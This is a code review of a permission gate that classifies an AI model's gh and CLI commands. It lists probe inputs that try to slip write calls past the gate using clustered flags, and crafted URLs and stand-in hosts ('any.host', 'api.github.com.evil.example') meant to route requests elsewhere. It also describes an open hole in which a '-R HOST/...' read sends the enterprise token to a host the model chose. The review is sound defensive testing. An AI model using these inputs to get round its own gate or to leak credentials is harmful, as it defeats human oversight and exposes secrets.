# Review T-15 round 2 (srv-cli, docs/04 C-1..C-4; fix commit d597c2d, head 9945fe6)

Round 1 (913f50d): request changes. 2 Blocking (gh clustered short flags ran writes as Read; `gh api <absolute URL>`
was an ungated, mislabelled raw-HTML fetch), 4 Should fix (gh config, cli deny-flag clustering, https-only vault
sinks, non-JSON bodies).

Ran: `cargo test -j 2 -p srv-cli` (51 passed, 1 ignored), `cargo clippy -j 2 -p srv-cli --all-targets -- -D warnings`
(clean), `cargo fmt -p srv-cli --check` (clean). Probed `srv_cli::gh::classify_with` from a scratch crate with 50
argument vectors, and checked gh 2.93.0's own flag table and request behaviour (`GH_DEBUG=api`, loopback only).

## Blocking

- none

## Should fix

- crates/srv-cli/src/gh/mod.rs:133 and :142-146: read commands still reach any host through `-R/--repo
  [HOST/]OWNER/REPO` or a URL repo argument, and the gate domain stays `github.com`. Probes: `pr view -R any.host/o/r 5`,
  `issue list --repo any.host/o/r` and `repo view https://any.host/o/r` all give (Read, github.com). With gh 2.93.0,
  `GH_DEBUG=api gh pr view -R 127.0.0.1:9/o/r 5` sends requests to `https://127.0.0.1:9/api/v3/meta` and `/api/graphql`.
  When `GH_ENTERPRISE_TOKEN` is set, they carry `Authorization: token ...`, so a Read with no ask sends that credential
  to a host the model chose. This is the same domain hole as round-1 item 2, through a different flag. No raw page
  reaches the model, because gh parses the GraphQL JSON. Fix it the way `--hostname` is handled: when a repo argument
  names a host, require github.com or `SB_GH_HOSTS` and use that host as the domain. Otherwise refuse it. Add a test.
  It can be a tracked follow-up (blocker entry) if supreme prefers.
- crates/srv-cli/src/gh/mod.rs:333-336: `api https://api.github.com/repos/o/r -X POST` is gated under domain
  `api.github.com`, but `api repos/o/r -X POST` reaches the same host and is gated under `github.com`. The gate matches
  domains exactly (core/src/gate.rs:476-488), so a user rule on `(github.com, account)` is skipped for the full-URL
  form, which falls through to `*` or the default. Map `api.github.com` to `github.com` so the two forms get one domain.

## Notes

- Round-1 Blocking 1 is closed. These now give Account: `api -iXPOST`, `api -iX POST`, `api -iX=PATCH`, `-iftitle=x`,
  `-iF a=1`, `-Xpost`, `-fX POST`, `-FXGET`, `--method=post`, `--METHOD=GET` (unknown long flag), `-X` as the last
  token, `-X=`, `--input=-`, `--raw-field=a=b`, `-XGET --field=a=b`, `--method GET --method POST` (the class only goes
  up), and `-- -XPOST`. `-iXDELETE` gives Delete. `pr view 5 -cw`, `-wc` and `-Rw` give Navigate. `-qX POST` gives
  Read, which is correct: pflag reads `X` as the jq value, so the request is a GET. The short and long flag sets match
  `gh api --help` exactly (X F f H p q t take a value; i h are boolean). Tests: gh/mod.rs `classification_table`.
- Round-1 Blocking 2 is closed. These are refused: `api https://any.host/page`, `HTTPS://...`, `//any.host/x`,
  `http://api.github.com/...`, userinfo forms (`https://u@api.github.com/x`, `https://api.github.com@any.host/x`),
  `api.github.com.evil.example`, `--hostname any.host` and `--hostname=any.host`, an endpoint after `--`, and an
  endpoint after an unknown flag. A URL inside a flag value (`-t https://any.host/`, `-Hhttps://...`,
  `-f body=https://...`) is correctly not treated as the endpoint. `https:any.host/x` is safe because gh only treats
  `://` as a full URL. Test: `api_hosts_are_github_api_hosts_only`.
- `-H X-HTTP-Method-Override:POST` stays Read. gh still sends a GET, and Rack-style overrides apply only to POST. That
  is acceptable; it could fail closed if `-H` values ever matter.
- All 4 round-1 Should-fix items are fixed, each with a test:
  - The whole `gh config` group is refused (gh/mod.rs:124, D-542).
  - cli deny_flags match a denied letter anywhere in a cluster: `dig -4f`, `-46fnames.txt`, `-4k`, `-6y`, `git log -pc`
    (cli.rs:161).
  - `http::secure_base` requires https except for loopback (http.rs:96). It covers both `SB_CLOUDFLARE_API` (checked
    in `join`) and flags providers (checked in flags.rs:90).
  - `reply_text` shows only the status and content type for a body that is not JSON or text/plain (http.rs:208-233).
    It also handles error statuses and a missing content type.
  - Round-1 notes taken: the segment-boundary base check (`/%2e%2e/v4x` is refused), the MAX_FAILING and MAX_CONTEXT
    caps are asserted, and cli-allow.toml now says the git cwd must be trusted.
- cli deny_flags still match long flags exactly. git's parse-options accepts unambiguous abbreviations in some
  commands (for example `git blame --textco`). The diff and revision options, including `--output`, do not accept
  abbreviations, and textconv only runs drivers from the trusted repository config. Low risk; worth a line in
  cli-allow.toml.
- A server that labels HTML as text/plain still gets its body shown. That is the accepted limit of a content-type check.
- No new hard-rule problems in d597c2d. No keys or .env files, no vault values in errors or tests, no sleeps, no em
  dashes, no `unwrap` on external input (only `unwrap_or` and test code). interfaces.yaml is untouched. srv-cli has no
  interface entry of its own, and the new `GhCall` and `classify_with` are crate-local API.
- Accepted follow-ups (not re-raised): loopback http follows the system proxy, `gh alias set` maps to auth (it asks),
  and strict letter matching gives false positives.

## Verdict

Both round-1 gate holes are closed, with tests that pin the probe cases, and all four should-fix items are done. No
rule breaks remain in the reviewed change. The remaining host and domain gaps (`-R HOST/...`, and `api.github.com`
vs `github.com`) are real but narrow. They are listed as should fix.

Verdict: approve
